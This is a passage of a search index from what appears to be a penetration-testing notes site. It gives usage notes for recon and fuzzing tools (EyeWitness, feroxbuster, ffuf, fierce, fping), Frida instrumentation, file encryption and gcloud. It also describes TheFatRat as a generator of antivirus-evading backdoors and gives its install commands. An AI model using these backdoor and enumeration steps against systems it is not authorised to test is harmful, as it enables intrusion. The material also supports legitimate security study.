example:</p>","tags":["pentesting","file"]},{"location":"exiftool/#tag-groups","title":"Tag groups","text":"<p>See all info related to Tag groups</p> <p>ExifTool classifies tags into groups in various families. Here is a list of the group names in each family:</p> Family Group Names 0 (Information\u00a0Type) AAC, AFCP, AIFF, APE, APP0, APP1, APP11, APP12, APP13, APP14, APP15, APP2, APP3, APP4, APP5, APP6, APP7, APP8, APP9, ASF, Audible, Canon, CanonVRD, Composite, DICOM, DNG, DV, DjVu, Ducky, EXE, EXIF, ExifTool, FITS, FLAC, FLIR, File, Flash, FlashPix, Font, FotoStation, GIF, GIMP, GeoTiff, GoPro, H264, HTML, ICC_Profile, ID3, IPTC, ISO, ITC, JFIF, JPEG, JSON, JUMBF, Jpeg2000, LNK, Leaf, Lytro, M2TS, MIE, MIFF, MISB, MNG, MOI, MPC, MPEG, MPF, MXF, MakerNotes, Matroska, Meta, Ogg, OpenEXR, Opus, PDF, PICT, PLIST, PNG, PSP, Palm, PanasonicRaw, Parrot, PhotoCD, PhotoMechanic, Photoshop, PostScript, PrintIM, QuickTime, RAF, RIFF, RSRC, RTF, Radiance, Rawzor, Real, Red, SVG, SigmaRaw, Sony, Stim, Theora, Torrent, Trailer, VCard, Vorbis, WTV, XML, XMP, ZIP 1\u00a0(Specific\u00a0Location) AAC, AC3, AFCP, AIFF, APE, ASF, AVI1, Adobe, AdobeCM, AdobeDNG, Apple, Audible, CBOR, CIFF, CameraIFD, Canon, CanonCustom, CanonDR4, CanonRaw, CanonVRD, Casio, Chapter#, Composite, DICOM, DJI, DNG, DV, DjVu, DjVu-Meta, Ducky, EPPIM, EXE, EXIF, ExifIFD, ExifTool, FITS, FLAC, FLIR, File, Flash, FlashPix, Font, FotoStation, FujiFilm, FujiIFD, GE, GIF, GIMP, GPS, GSpherical, Garmin, GeoTiff, GlobParamIFD, GoPro, GraphConv, H264, HP, HTC, HTML, HTML-dc, HTML-ncc, HTML-office, HTML-prod, HTML-vw96, HTTP-equiv, ICC-chrm, ICC-clrt, ICC-header, ICC-meas, ICC-meta, ICC-view, ICC_Profile, ICC_Profile#, ID3, ID3v1, ID3v1_Enh, ID3v2_2, ID3v2_3, ID3v2_4, IFD0, IFD1, IPTC, IPTC#, ISO, ITC, InfiRay, Insta360, InteropIFD, ItemList, JFIF, JFXX, JPEG, JPEG-HDR, JPS, JSON, JUMBF, JVC, Jpeg2000, KDC_IFD, Keys, Kodak, KodakBordersIFD, KodakEffectsIFD, KodakIFD, KyoceraRaw, LNK, Leaf, LeafSubIFD, Leica, Lyrics3, Lytro, M-RAW, M2TS, MAC, MIE-Audio, MIE-Camera, MIE-Canon, MIE-Doc, MIE-Extender, MIE-Flash, MIE-GPS, MIE-Geo, MIE-Image, MIE-Lens, MIE-Main, MIE-MakerNotes, MIE-Meta, MIE-Orient, MIE-Preview, MIE-Thumbnail, MIE-UTM, MIE-Unknown, MIE-Video, MIFF, MISB, MNG, MOBI, MOI, MPC, MPEG, MPF0, MPImage, MS-DOC, MXF, MacOS, MakerNotes, MakerUnknown, Matroska, MediaJukebox, Meta, MetaIFD, Microsoft, Minolta, MinoltaRaw, Motorola, NITF, Nikon, NikonCapture, NikonCustom, NikonScan, NikonSettings, NineEdits, Nintendo, Ocad, Ogg, Olympus, OpenEXR, Opus, PDF, PICT, PNG, PNG-cICP, PNG-pHYs, PSP, Palm, Panasonic, PanasonicRaw, Parrot, Pentax, PhaseOne, PhotoCD, PhotoMechanic, Photoshop, PictureInfo, PostScript, PreviewIFD, PrintIM, ProfileIFD, Qualcomm, QuickTime, RAF, RAF2, RIFF, RMETA, RSRC, RTF, Radiance, Rawzor, Real, Real-CONT, Real-MDPR, Real-PROP, Real-RA3, Real-RA4, Real-RA5, Real-RJMD, Reconyx, Red, Ricoh, SPIFF, SR2, SR2DataIFD, SR2SubIFD, SRF#, SVG, Samsung, Sanyo, Scalado, Sigma, SigmaRaw, Sony, SonyIDC, Stim, SubIFD, System, Theora, Torrent, Track#, UserData, VCalendar, VCard, VNote, Version0, Vorbis, WTV, XML, XMP, XMP-DICOM, XMP-Device, XMP-GAudio, XMP-GCamera, XMP-GCreations, XMP-GDepth, XMP-GFocus, XMP-GImage, XMP-GPano, XMP-GSpherical, XMP-LImage, XMP-MP, XMP-MP1, XMP-PixelLive, XMP-aas, XMP-acdsee, XMP-album, XMP-apple-fi, XMP-ast, XMP-aux, XMP-cc, XMP-cell, XMP-crd, XMP-creatorAtom, XMP-crs, XMP-dc, XMP-dex, XMP-digiKam, XMP-drone-dji, XMP-dwc, XMP-et, XMP-exif, XMP-exifEX, XMP-expressionmedia, XMP-extensis, XMP-fpv, XMP-getty, XMP-hdr, XMP-hdrgm, XMP-ics, XMP-iptcCore, XMP-iptcExt, XMP-lr, XMP-mediapro, XMP-microsoft, XMP-mwg-coll, XMP-mwg-kw, XMP-mwg-rs, XMP-nine, XMP-panorama, XMP-pdf, XMP-pdfx, XMP-photomech, XMP-photoshop, XMP-plus, XMP-pmi, XMP-prism, XMP-prl, XMP-prm, XMP-pur, XMP-rdf, XMP-sdc, XMP-swf, XMP-tiff, XMP-x, XMP-xmp, XMP-xmpBJ, XMP-xmpDM, XMP-xmpDSA, XMP-xmpMM, XMP-xmpNote, XMP-xmpPLUS, XMP-xmpRights, XMP-xmpTPg, ZIP, iTunes 2\u00a0(Category) Audio, Author, Camera, Device, Document, ExifTool, Image, Location, Other, Preview, Printing, Time, Unknown, Video 3\u00a0(Document\u00a0Number) Doc#, Main 4\u00a0(Instance\u00a0Number) Copy# 5\u00a0(Metadata\u00a0Path) eg. JPEG-APP1-IFD0-ExifIFD 6\u00a0(EXIF/TIFF\u00a0Format) int8u, string, int16u, int32u, rational64u, int8s, undef, int16s, int32s, rational64s, float, double, ifd, unicode, complex, int64u, int64s, ifd64 7\u00a0(Tag\u00a0ID) ID-xxx (where xxx is the tag ID. Numerical ID's are given in hex with a leading \"0x\" if the\u00a0HexTagIDs API option\u00a0is set, as are characters in non-numerical ID's which are not valid in a group name. Note that unlike other group names, family 7 group names are case sensitive.) 8\u00a0(File\u00a0Number) File# (for files loaded via\u00a0<code>-file_NUM_</code>\u00a0option) <p>The exiftool output can be organized based on these groups using the\u00a0<code>-g</code>\u00a0or\u00a0<code>-G</code>\u00a0option (ie.\u00a0<code>-g1</code>\u00a0to see family 1 groups, or\u00a0<code>-g3:1</code>\u00a0to see both family 3 and family 1 group names in the output. See the\u00a0<code>-g</code>\u00a0option in the exiftool application documentation for more details, and the\u00a0GetGroup\u00a0function in the ExifTool library for a description of the group families. Note that when writing, only family 0, 1, 2 and 7 group names may be used.</p>","tags":["pentesting","file"]},{"location":"eyewitness/","title":"EyeWitness","text":"<p>EyeWitness is designed to take screenshots of websites provide some server header info, and identify default credentials if known. EyeWitness is designed to run on Kali Linux.</p>","tags":["pentesting","web pentesting","enumeration"]},{"location":"eyewitness/#installation","title":"Installation","text":"<p>Download from: https://github.com/FortyNorthSecurity/EyeWitness.</p>","tags":["pentesting","web pentesting","enumeration"]},{"location":"eyewitness/#basic-usage","title":"Basic usage","text":"<p>First, create a file with the target domains, like for instance, listOfdomains.txt.</p> <p>Then, run:</p> <pre><code>eyewitness --web -f listOfdomains.txt -d path/to/save/\n</code></pre> <p>After that you will get a report.html file with the request and a screenshot of those domains. You will also have the source index.html code and the libraries in use.</p>","tags":["pentesting","web pentesting","enumeration"]},{"location":"eyewitness/#proxing-the-request-via-burpsuite","title":"Proxing the request via BurpSuite","text":"<pre><code>eyewitness --web -f listOfdomains.txt -d path/to/save/ --proxy-ip 127.0.0.1 --proxy-port 8080\n</code></pre>","tags":["pentesting","web pentesting","enumeration"]},{"location":"fatrat/","title":"FatRat","text":"<p>TheFatRat\u00a0is an exploiting tool which compiles a malware with famous payload, and then the compiled maware can be executed on Linux , Windows , Mac and Android.\u00a0TheFatRat\u00a0Provides An Easy way to create Backdoors and Payload which can bypass most anti-virus.</p>"},{"location":"fatrat/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/screetsec/TheFatRat.git\ncd TheFatRat\nchmod +x fatrat setup.sh\nsudo ./setup.sh\n</code></pre>"},{"location":"fatrat/#basic-usage","title":"Basic usage","text":"<pre><code># After launching it, browse the menu that fatrat has\ncd TheFatRat\nsudo fatrat\n</code></pre>"},{"location":"feroxbuster/","title":"feroxbuster - A web content enumeration tool for not referenced resources","text":"<p>feroxbuster is used to perform forced browsing. Forced browsing allows us to enumerate and access resources that are not referenced by the web application, but are still accessible by an attacker. </p> <p>Feroxbuster uses brute force combined with a wordlist to search for unlinked content in target directories.</p>","tags":["pentesting","web enumeration","tool","reconnaissance"]},{"location":"feroxbuster/#installation","title":"Installation","text":"<p>See the repo: https://github.com/epi052/feroxbuster.</p> <pre><code>sudo apt update &amp;&amp; sudo apt install -y feroxbuster\n</code></pre>","tags":["pentesting","web enumeration","tool","reconnaissance"]},{"location":"feroxbuster/#dictionaries","title":"Dictionaries","text":"<p>path to dictionary: /etc/feroxbuster/ferox-config.toml</p>","tags":["pentesting","web enumeration","tool","reconnaissance"]},{"location":"feroxbuster/#basic-commands","title":"Basic commands","text":"<pre><code># Include headers in the request\nferoxbuster -u http://127.1 -H Accept:application/json \"Authorization: Bearer {token}\"\n\n# Read urls from STDIN; pipe only resulting urls out to another tool\ncat targets | feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files\n\n# Proxy traffic through Burp\nferoxbuster -u http://127.1 --insecure --proxy http://127.0.0.1:8080\n\n# Proxy traffic through a SOCKS proxy (including DNS lookups)\nferoxbuster -u http://127.1 --proxy socks5h://127.0.0.1:9050\n\n# Pass auth token via query parameter\nferoxbuster -u http://127.1 --query token=0123456789ABCDEF\n</code></pre>","tags":["pentesting","web enumeration","tool","reconnaissance"]},{"location":"ffuf/","title":"ffuf - A fast web fuzzer written in Go","text":"","tags":["pentesting","web pentesting","enumeration"]},{"location":"ffuf/#installation","title":"Installation","text":"<p>Download from: https://github.com/ffuf/ffuf</p>","tags":["pentesting","web pentesting","enumeration"]},{"location":"ffuf/#basic-commands","title":"Basic commands","text":"<pre><code>ffuf -w /path/to/wordlist -u https://target/FUZZ\n\n####### Matchers options #######\n# -mc: Match HTTP status codes, or \"all\" for everything. (default: 200,204,301,302,307,401,403,405)\n# -ml: Match amount of lines in response\n# -mr: Match regexp\n# -ms: Match HTTP response size\n# -mw: Match amount of words in response\n\n####### Filters options #######\n# -fc: Filter HTTP status codes from response. Comma separated list of codes and ranges\n# -fl: Filter by amount of lines in response. Comma separated list of line counts and ranges\n# -fr: Filter regexp\n# -fs: Filter HTTP response size. Comma separated list of sizes and ranges\n# -fw: Filter by amount of words in response. Comma separated list of word counts and ranges\n\n# Virtual Host enumeration\n# use a vhost dictionary file\ncp /usr/share/wordlists/secLists/Discovery/DNS/namelist.txt ./vhosts\n\nffuf -w ./vhosts -u http://$ip -H \"HOST: FUZZ.example.com\" -fs 612\nffuf -w /path/to/vhost/wordlist -u https://$ip -H \"Host: FUZZ\" -fs 612\nffuf -w  /path/to/vhost/wordlist:FUZZ -u http://example.com:$port/ -H 'Host: FUZZ.example.com' -fs &lt;sizeNumberToExclude&gt;\n\n# `-w`: Path to our wordlist\n# `-u`: URL we want to fuzz\n# `-H \"HOST: FUZZ.example.com\"`: This is the `HOST` Header, and the word `FUZZ` will be used as the fuzzing point.\n# `-fs 612`: Filter responses with a size of 612, default response size in this case.\n\n\n# Enumerating extensions\n# Note: The wordlist we chose already contains a dot (.), so we will not have to add the dot after \"index\" in our fuzzing.\nfuf -w /usr/share/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://$ip:$port/folderexample/indexFUZZ\n\n\n# Enumerating directories and folders:\nffuf -recursion -recursion-depth 1 -u http://$ip/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -e .php -v\n# -recursion: activates the recursive scan\n# -recursion-depth 1: specifies the maximum depth to scan\n# -e is used to indicate the extension, because when fuzzing directories with recursiveness, the url needs to end up in /FUZZ\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://$ip:$port/FUZZ -recursion -recursion-depth 1 -e .php\n\n\n# fuzz a combination of folder names, with a wordlist of possible files and a dictionary of extensions\nffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://$ip/FOLDERS/WORDLISTEXTENSIONS\n\n\n# Fuzzing parameters\n\n# with GET method\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php?FUZZ=key -fs xxx\n# Fuzzing with POST method:\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx\n\n# Fuzzing values:\n# First create a list of 1000 id values, from 1 to 1000\nfor i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done\n# Now, fuzz\nffuf -w ids.txt:FUZZ -u http://admin.academy.htb:$port/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx\n</code></pre> <p>By pressing ENTER during ffuf execution, the process is paused and user is dropped to a shell-like interactive mode: in this mode, filters can be reconfigured, queue managed and the current state saved to disk.</p>","tags":["pentesting","web pentesting","enumeration"]},{"location":"fierce/","title":"fierce - DNS scanner that helps locate non-contiguous IP space and hostnames","text":"<p>Fierce is a semi-lightweight scanner that helps locate non-contiguous IP space and hostnames against specified domains.  It's  really  meant  as  a pre-cursor to nmap, OpenVAS, nikto, etc, since all of those require that you already know what IP space you are looking for.  This does not perform exploitation and does not scan the whole internet indiscriminately. It is  meant  specifically to  locate likely targets both inside and outside a corporate network.  Because it uses DNS primarily you will often find mis-configured networks that leak internal address space. That's especially useful in targeted malware. Originally  written  by  RSnake along with others at http://ha.ckers.org/. </p> <pre><code># Perform a dns transfer using a wordlist againts domain.com\nfierce -dns domain.com \n\n# Brute force subdomains with a seclist\nfierce --domain domain.com --subdomain-file fierce-hostlist.txt\n</code></pre>","tags":["pentesting","dns","enumeration","tools"]},{"location":"figlet/","title":"Figlet","text":"","tags":["tools"]},{"location":"figlet/#installation","title":"Installation","text":"<pre><code>sudo apt install figlet\n</code></pre>","tags":["tools"]},{"location":"figlet/#basic-commands","title":"Basic commands","text":"<pre><code># Show all fonts\nshowfigfonts\n\n# Usage\nfiglet -f banner \"lalala\"\n# -f font\n# banner is just a font\n# \"lalala\" the text that will be displayed\n\n\n#                                          \n#         ##   #        ##   #        ##   \n#        #  #  #       #  #  #       #  #  \n#       #    # #      #    # #      #    # \n#       ###### #      ###### #      ###### \n#       #    # #      #    # #      #    # \n####### #    # ###### #    # ###### #    # \n</code></pre>","tags":["tools"]},{"location":"file-encryption/","title":"File encryption","text":"<p>title: File Encryption: windows and linux author: amandaguglieri draft: false TableOfContents: true tags:   - file encryption   - windows   - linux</p>"},{"location":"file-encryption/#file-encryption","title":"File Encryption","text":""},{"location":"file-encryption/#windows","title":"Windows","text":""},{"location":"file-encryption/#invoke-aesencryptionps1-powershell-script","title":"Invoke-AESEncryption.ps1 PowerShell script","text":"<p>Invoke-AESEncryption.ps1 PowerShell script</p> <p>After the script has been transferred, it only needs to be imported as a module, as shown below.</p> <pre><code>PS C:\\htb&gt; Import-Module .\\Invoke-AESEncryption.ps1\n</code></pre> <p>This command creates an encrypted file with the same name as the encrypted file but with the extension \"<code>.aes</code>.\" Cheat sheet for encrypting and decrypting files:</p> <pre><code>############\n# ENCRYPTION\n############\n# Encrypts the string \"Secret Test\" and outputs a Base64 encoded ciphertext\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Text \"Secret Text\" \n\n# Encrypts the file \"file.bin\" and outputs an encrypted file \"file.bin.aes\"\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin\n\n# Decrypts the file \"file.bin\" and outputs an encrypted file \"file.bin.aes\"\nInvoke-AESEncryption -Mode Encrypt -Key \"p@ssw0rd\" -Path file.bin.aes\n</code></pre> <pre><code>############\n# DECRYPTION\n############\n# Decrypts the Base64 encoded string \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\" and outputs plain text.\nInvoke-AESEncryption -Mode Decrypt -Key \"p@ssw0rd\" -Text \"LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=\"\n</code></pre>"},{"location":"file-encryption/#linux","title":"Linux","text":"<p>See openssl</p> <pre><code># Encrypt a file\nopenssl enc -aes-256-cbc -iter 100000 -pbkdf2 -in sourceFile.txt -out outputFile.txt.enc\n# -iter 100000: Optional. Override the default iterations counts with this option.\n# -pbkdf2: Optional. Use the Password-Based Key Derivation Function 2 algorithm.\n\n# Decrypt a file\nopenssl enc -d -aes-256-cbc -iter 100000 -pbkdf2 -in encryptedFile.enc -out outputFile.txt\n\n# Generate private key\nopenssl genrsa -aes256 -out private.pem 2048\n\n# Generate public key\nopenssl rsa -in private.pem -outform PEM -pubout -out public.pem\n\n# Encrypt a file with public key\nopenssl rsautl -encrypt -inkey public.pem -pubin -in file.txt -out file.enc\n# -pubin: Specify the entry parameter\n\n# Decrypt a dile with private key\nopenssl rsautl -decrypt -inkey private.pem -in file.enc -out file.txt\n</code></pre>"},{"location":"finalrecon/","title":"Final recon","text":"<p>A Python-based reconnaissance tool offering a range of modules for different tasks like SSL certificate checking, Whois information gathering, header analysis, and crawling. Its modular structure enables easy customisation for specific needs.</p>","tags":["enumeration","snmp","port","161","tools"]},{"location":"finalrecon/#installation","title":"Installation","text":"<pre><code>git clone https://github.com/thewhiteh4t/FinalRecon.git\ncd FinalRecon\npip3 install -r requirements.txt\nchmod +x /finalrecon.py\n</code></pre>","tags":["enumeration","snmp","port","161","tools"]},{"location":"finalrecon/#basic-commands","title":"Basic commands","text":"Option Argument Description <code>-h</code>,\u00a0<code>--help</code> Show the help message and exit. <code>--url</code> URL Specify the target URL. <code>--headers</code> Retrieve header information for the target URL. <code>--sslinfo</code> Get SSL certificate information for the target URL. <code>--whois</code> Perform a Whois lookup for the target domain. <code>--crawl</code> Crawl the target website. <code>--dns</code> Perform DNS enumeration on the target domain. <code>--sub</code> Enumerate subdomains for the target domain. <code>--dir</code> Search for directories on the target website. <code>--wayback</code> Retrieve Wayback URLs for the target. <code>--ps</code> Perform a fast port scan on the target. <code>--full</code> Perform a full reconnaissance scan on the target. <pre><code>./finalrecon.py --headers --whois --url http://domain.com\n</code></pre>","tags":["enumeration","snmp","port","161","tools"]},{"location":"footprinting/","title":"01. Information Gathering   /  Footprinting","text":"","tags":["footprinting","CPTS","eWPT"]},{"location":"footprinting/#methodology","title":"Methodology","text":"Layer Description Information Categories 1. Internet Presence Identification of internet presence and externally accessible infrastructure. Domains, Subdomains, vHosts, ASN, Netblocks, IP Addresses, Cloud Instances, Security Measures 2. Gateway Identify the possible security measures to protect the company's external and internal infrastructure. Firewalls, DMZ, IPS/IDS, EDR, Proxies, NAC, Network Segmentation, VPN, Cloudflare 3. Accessible Services Identify accessible interfaces and services that are hosted externally or internally. Service Type, Functionality, Configuration, Port, Version, Interface 4. Processes Identify the internal processes, sources, and destinations associated with the services. PID, Processed Data, Tasks, Source, Destination 5. Privileges Identification of the internal permissions and privileges to the accessible services. Groups, Users, Permissions, Restrictions, Environment 6. OS Setup Identification of the internal components and systems setup. OS Type, Patch Level, Network config, OS Environment, Configuration files, sensitive private files","tags":["footprinting","CPTS","eWPT"]},{"location":"footprinting/#owasp-reference","title":"OWASP reference","text":"ID WSTG-ID Test Name Objectives Tools 1.1 WSTG-INFO-01 Conduct Search Engine Discovery Reconnaissance for Information Leakage - Identify what sensitive design and configuration information of the application, system, or organization is exposed directly (on the organization's website) or indirectly (via third-party services). Google Hacking  Shodan  Recon-ng 1.2 WSTG-INFO-02 Fingerprint Web Server - Determine the version and type of a running web server to enable further discovery of any known vulnerabilities. Wappalyzer  Nikto 1.3 WSTG-INFO-03 Review Webserver Metafiles for Information Leakage - Identify hidden or obfuscated paths and functionality through the analysis of metadata files (robots.txt,  tag, sitemap.xml)  - Extract and map other information that could lead to a better understanding of the systems at hand. Browser  Curl  Burpsuite/ZAP 1.4 WSTG-INFO-04 Enumerate Applications on Webserver - Enumerate the applications within the scope that exist on a web server.  - Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers dnsrecon  Nmap 1.5 WSTG-INFO-05 Review Webpage Content for Information Leakage - Review webpage comments, metadata, and redirect bodies to find any information leakage.  - Gather JavaScript files and review the JS code to better understand the application and to find any information leakage.  - Identify if source map files or other front-end debug files exist. Browser  Curl  Burpsuite/ZAP 1.6 WSTG-INFO-06 Identify Application Entry Points - Identify possible entry and injection points through request and response analysis which covers hidden fields, parameters, methods HTTP header analysis OWASP ASD  Burpsuite/ZAP 1.7 WSTG-INFO-07 Map Execution Paths Through Application - Map the target application and understand the principal workflows.  - Use HTTP(s) Proxy Spider/Crawler feature aligned with application walkthrough Burpsuite/ZAP 1.8 WSTG-INFO-08 Fingerprint Web Application Framework - Fingerprint the components being used by the web applications.  - Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders, Error message. Whatweb  Wappalyzer  CMSMap 1.9 WSTG-INFO-09 Fingerprint Web Application N/A, This content has been merged into: WSTG-INFO-08 NA 1.10 WSTG-INFO-10 Map Application Architecture - Understand the architecture of the application and the technologies in use.  - Identify application architecture whether on Application and Network components:  Applicaton: Web server, CMS, PaaS, Serverless, Microservices, Static storage, Third party services/APIs  Network and Security: Reverse proxy, IPS, WAF WAFW00F  Nmap","tags":["footprinting","CPTS","eWPT"]},{"location":"fping/","title":"fping - An improved ping tool","text":"<p>https://fping.org/</p> <p>Linux tool which is an improved version of the ping utility:</p> <pre><code>fping -a -g -s -q $ipRange\nfping -agsq $ipRange\n# -a: forces the tool to show only alive hosts.\n# -g: tells the tool we want to perform a ping sweep instead of a standard ping.\n# -s: prints stats at the end of the scan\n# -q: not to show per-target results\n</code></pre> <p>Also you can use the CIDR notation: </p> <pre><code>fping -a -g 10.54.12.0/24\nfping -a -g 10.54.12.0 10.54.12.255\n</code></pre>","tags":["scanning","reconnaissance","ping"]},{"location":"frida/","title":"Frida - A dynamic instrumentation toolkit","text":"<p>Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers.  It lets you inject snippets of JavaScript or your own library into native apps on Windows, macOS, GNU/Linux, iOS, watchOS, tvOS, Android, FreeBSD, and QNX. Frida also provides you with some simple tools built on top of the Frida API. These can be used as-is, tweaked to your needs, or serve as examples of how to use the API. More.</p>","tags":["mobile pentesting"]},{"location":"frida/#installation-and-set-up","title":"Installation and set up","text":"<p>Download it:</p> <pre><code>pip install frida-tools\npip install frida\nwget https://github.com/frida/frida/releases/download/15.1.14/frida-server-15.1.14-android-x86.xz\n</code></pre> <p>Unzip the file with extension xz:</p> <pre><code>unxz frida-server-15.1.14-android-x86.xz\n</code></pre> <p>Make sure we're connected to the device:</p> <pre><code>adb connect 192.168.156.103:5555\n</code></pre> <p>Upload frida file to the device:</p> <pre><code>adb push frida-server-15.1.14-android-x86 /data/local/tmp/frida-server\n</code></pre> <p>We go to the path where we have stored the file:</p> <pre><code>adb shell\ncd /data/local/temp\n</code></pre> <p>We list contents, see frida-server file, and we change permissions:</p> <pre><code>ls -la\nchmod 777 frida-server\n</code></pre> <p>Now we can run the binary:</p> <pre><code>./frida-server\n</code></pre> <p>From another terminal we can see processes running on the device:</p> <pre><code>frida-ps U\n</code></pre>","tags":["mobile pentesting"]},{"location":"frida/#install-burp-certificate-in-frida","title":"Install Burp Certificate in Frida","text":"<p>Our goal is to install it at: /system/etc/security/cacerts. Here we can find stored Authority certificates and it 's the place where we will install Burp certificate.</p> <p>First, we open Burp &gt; Proxy &gt; Options &gt; Proxy Listener and we click on \"Import / Export CA Certificate\". We save it in DER format to a folder accessible from kali. We can give it the name: cacert.der.</p> <p>Second, we convert der format to pem:</p> <pre><code>openssl x509 -inform DER -in cacert.der -out cacert.pem\n</code></pre> <p>Now, we extract the hash that we will use later on to name the certificate.</p> <pre><code>openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1\n</code></pre> <p>It returns (for instance): 9a5ba575.</p> <p>Let's change the name to cacert.pem:</p> <pre><code>mv cacert.pem 9a5ba575.0\n</code></pre> <p>To act as root we'll run:</p> <pre><code>adb root\n</code></pre> <p>And to mount again the units:</p> <pre><code>adb remount\n</code></pre> <p>Netx step will be to upload the certificate 9a5ba575.0 to the SD Card:</p> <pre><code>adb push 9a5ba575.0 /sdcard/\n</code></pre> <p>Let's go to that directory and move the file to our preferred location:</p> <pre><code>adb shell\ncd /sdcard\nls -la\nmv 9a5ba575.0 /system/etc/security/cacerts\n</code></pre> <p>Change permissions to the file:</p> <pre><code>chmod 644 /system/etc/security/cacerts/9a5ba575.0\n\nIn Burp now we need a Proxy Listener. We will indicate the Host-Only IP that we have in our kali. For instance: 192.168.156.107. Port: 8080.\n\nAnd in the wifi settings of the virtual device running on GenyMotion (for instance a Galaxy6), we need to indicate this same IP on Host-Only mode from our kali.\n</code></pre>","tags":["mobile pentesting"]},{"location":"frida/#basic-commands","title":"Basic commands","text":"<pre><code># Display active processes, and installed\nfrida-ps -Ua\n\n\n# Restaurate class loaders\nJava.perform(function() {\n    var application = Java.use(\"android.com.application\");\n    var classloader;\n    application.attach.overload('android.content.Context').implementation = function(context) {\n        var result = this.attach(context);\n        classloader = context.getClassLoader();\n        Java.classFactory.loader = classloader;\n    return result;\n    }\n})\n\n# Enumerate classes loaded in memory\nJava.perform(function() {\n    Java.enumerateLoadedClasses\n    ({\n        \"onMatch\": function(className) {\n            console.log(className)\n            },\n        \"onComplete\": function(){]\n    })\n})\n\n# Enumerate classes loaded in memory linked to a specific &lt;package&gt;\nJava.enumerateLoadedClasses\n({\n    \"onMatch\": function(className) {\n        if(className.includes(\"&lt;package&gt;\")) {\n            console.log(className);\n        }\n    },\n    \"onComplete\": function(){]\n});\n\n# Android version installed on device\nJava.androidVersion\n\n# Execute a method of an Activity\nJava.choose(\"&lt;Name and path of the activity&gt;\"), {\n    onMatch: function(instance) {\n    // This function will be called for every instance found by frida console.log (Found instance: \"+ instance).\n        instace.&lt;Method name&gt;/&lt;function()&gt;;\n    },\n    onComplete: function(){}\n});\n\n# Save an Activity in a variable\nvar NameofVariable = Java.use(com.android.application.&lt;nameOfActivity&gt;); \n\n# Execute a script js from Frida\nfrida -U com.android.applicationName -l instance.js\n\n# Modify the implementation of a function\nvar activity = Java.use(com.droidhem.basketball.adapters.Game);\nactivity.normalshoot.implementation = function(x,y){\n    //print the original arguments\n    console.log(\"Dentro de normalshoot\");\n    this.score.value += 10000;\n    // in the original code:\n    // this.score += 2;\n}\n</code></pre>","tags":["mobile pentesting"]},{"location":"gcloud-cli/","title":"gcloud CLI","text":"<pre><code># Get a list of images \ngcloud compute images list \n\n\n# PROJECT=&lt;PROJECT&gt; # Replace this with your project id \n# ZONE=&lt;zone&gt;   # Replace this with a GCP zone of your choice \n\n# Launch a GCE instance \ngcloud compute instances create gcp-lab1 \\ \n --project=$PROJECT \\ \n --zone=$ZONE \\ \n --machine-type=f1-micro \\ \n --tags=http-server \\ \n --image=ubuntu-1804-bionic-v20190722a \\ \n --image-project=ubuntu-os-cloud \n\n# Get a list of instances\ngcloud compute instances list\n\n# Filter instances by zone \ngcloud compute instances list --zone=&lt;zone&gt;\n\n\n\n# SSH into the VM. This commands create the pair of keys and all ssh infrastructure needed for the connection\ngcloud compute ssh &lt;instance&gt; --zone=&lt;zone-of-instance&gt; \n\n\n# Open port 80 for HTTP access \ngcloud compute firewall-rules create default-allow-http \\ \n --project=$PROJECT \\ \n --direction=INGRESS \\ \n --action=ALLOW \\ \n --rules=tcp:80 \\ \n --source-ranges=0.0.0.0/0 \\ \n --target-tags=http-server \n\n\n# Run these commands within the VM \nsudo apt-get install -y apache2 \nsudo systemctl start apache2 \n\n\n# Access Apache through the public IP \n# Terminate the instance \ngcloud compute instances delete gcp-lab1 --zone $ZONE \n\n\n# Connect to Google Cloud SQL\ngcloud sql connect &lt;nameOfDatabase&gt;\n\n\n ```\n\n\n\n### Add an image to GCP Container Registry\n\nIn GCP Dashboard go yo Container Registry. First time it will be empty. \n\n```bash\n# Run the below commands in Google Cloud Shell \n\ngcloud services enable containerregistry.googleapis.com \n\nexport PROJECT_ID=&lt;PROJECT ID&gt; # Replace this with your GCP Project ID \n\ndocker pull busybox \ndocker images \n</code></pre> <pre><code>cat &lt;&lt;EOF &gt;&gt;Dockerfile \nfrom busybox:latest \nCMD [\"date\"] \nEOF \n</code></pre> <pre><code># Build your own instance of busybox and name it mybusybox\ndocker build . -t mybusybox \n\n# Tag your image with the convention stated by GCP\ndocker tag mybusybox gcr.io/$PROJECT_ID/mybusybox:latest \n# When listing images with docker images, you will see it renamed.\n\n# Run your image\ndocker run gcr.io/$PROJECT_ID/mybusybox:latest \n</code></pre> <pre><code># Associate gcp credentials with docker CLI  \ngcloud auth configure-docker \n\n# Take our mybusybox image available in the environment and pushes it to the Container Registry.\ndocker push gcr.io/$PROJECT_ID/mybusybox:latest \n</code></pre>","tags":["cloud","google cloud platform","gcp"]},{"location":"gcloud-cli/#demo-of-anthos","title":"Demo of Anthos","text":"<pre><code># Run the below commands in the macOS Terminal \n\nexport PROJECT_ID=&lt;PROJECT ID&gt; # Replace this with your GCP project ID \nexport REGION=&lt;REGION ID&gt; # Replace this with a valid GCP region \n\ngcloud config set project $PROJECT_ID \ngcloud config set compute/region $REGION \n\n# 